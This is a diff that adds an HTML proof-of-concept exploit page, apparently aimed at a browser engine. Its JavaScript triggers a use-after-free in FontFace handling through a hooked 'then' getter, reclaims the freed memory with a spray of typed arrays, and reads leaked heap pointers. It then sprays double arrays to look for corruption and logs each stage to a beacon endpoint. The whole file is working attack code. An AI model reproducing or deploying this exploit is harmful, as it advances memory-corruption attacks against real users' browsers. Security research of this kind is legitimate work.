@@ -1,0 +1,103 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p809</title></head>
+<body><pre id="out">p809</pre>
+<script>
+var O=document.getElementById("out");
+function bk(t,d){O.textContent+="\n"+t+(d?"-"+d:"");try{new Image().src="/beacon/P809-"+encodeURIComponent(t+(d?"-"+d:""))+"?t="+Date.now();}catch(e){}}
+function f64hex(v){var b=new ArrayBuffer(8);new Float64Array(b)[0]=v;var u=new Uint32Array(b);return((u[1]>>>0).toString(16)).padStart(8,"0")+((u[0]>>>0).toString(16)).padStart(8,"0");}
+
+bk("START","");
+
+// APPROACH: Use FontFace UAF to get heap addresses (L1/L2),
+// then spray JSArrays with enough elements that some butterflies
+// land in the same heap region as L1. If a butterfly overlaps
+// with hash table data, reading array elements gives heap pointers.
+
+var SIZE=192,K=256,fired=false;
+var vf,fs2;
+
+try{
+  vf=new FontFace("vf","local(Helvetica)",{unicodeRange:"U+0041"});
+  document.fonts.add(vf);void vf.loaded;
+  fs2=document.createElement("style");
+  fs2.textContent="@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(fs2);
+
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs2.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load("1em vf, v1","AB").then(function(faces){
+    bk("RES","n"+faces.length);
+    setTimeout(function(){
+      // Find hit
+      var L1=0n,L2=0n;
+      for(var i=0;i<window.__sp.length;i++){
+        var buf=window.__sp[i];
+        var lo=0,hi=0;
+        for(var j=0;j<4;j++){lo|=buf[0x58+j]<<(j*8);hi|=buf[0x5C+j]<<(j*8);}
+        if((hi>>>0)>=0x10&&(hi>>>0)<0xFFFF){
+          L1=BigInt(hi>>>0)*4294967296n+BigInt(lo>>>0);
+          var lo2=0,hi2=0;
+          for(var j=0;j<4;j++){lo2|=buf[0x68+j]<<(j*8);hi2|=buf[0x6C+j]<<(j*8);}
+          L2=BigInt(hi2>>>0)*4294967296n+BigInt(lo2>>>0);
+          break;
+        }
+      }
+      bk("L1","0x"+L1.toString(16));
+      bk("L2","0x"+L2.toString(16));
+      if(!L1){bk("NOLEAK","");return;}
+
+      // Set all status to 0
+      for(var i=0;i<window.__sp.length;i++)window.__sp[i][0x82]=0;
+
+      // Spray JSArrays with 8-element double arrays
+      // Butterflies are in Gigacage — different region from L1
+      // BUT: let us check if any array element is unexpectedly non-double
+      bk("SPRAY","1000 arrays x 8 doubles");
+      var arrays=[];
+      for(var i=0;i<1000;i++){
+        var a=[1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];
+        arrays.push(a);
+      }
+
+      // Check for corruption (any value that isn't what we set)
+      var anomalies=[];
+      var expected=[1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];
+      for(var i=0;i<arrays.length;i++){
+        for(var j=0;j<8;j++){
+          var v=arrays[i][j];
+          if(v!==expected[j]){
+            anomalies.push("arr["+i+"]["+j+"]="+f64hex(v));
+            if(anomalies.length>=10)break;
+          }
+        }
+        if(anomalies.length>=10)break;
+      }
+      bk("ANOMALIES",anomalies.length>0?anomalies.join(" "):"none");
+
+      // Phase 2: Try accessing array elements as BigInt64Array
+      // (reinterpret the double array backing as 64-bit integers)
+      bk("BIGINT","checking via BigInt64Array view");
+      try{
+        var testAB=new ArrayBuffer(64);
+        var f64v=new Float64Array(testAB);
+        var bi64=new BigInt64Array(testAB);
+        f64v[0]=1.1;
+        bk("REINTERPRET","1.1 as bigint = 0x"+bi64[0].toString(16));
+      }catch(e){bk("BIGINT-ERR",e.message.slice(0,40));}
+
+      bk("DONE","L1=0x"+L1.toString(16));
+    },100);
+  });
+}catch(e){bk("ERR",e.message.slice(0,60));}
+</script></body></html>
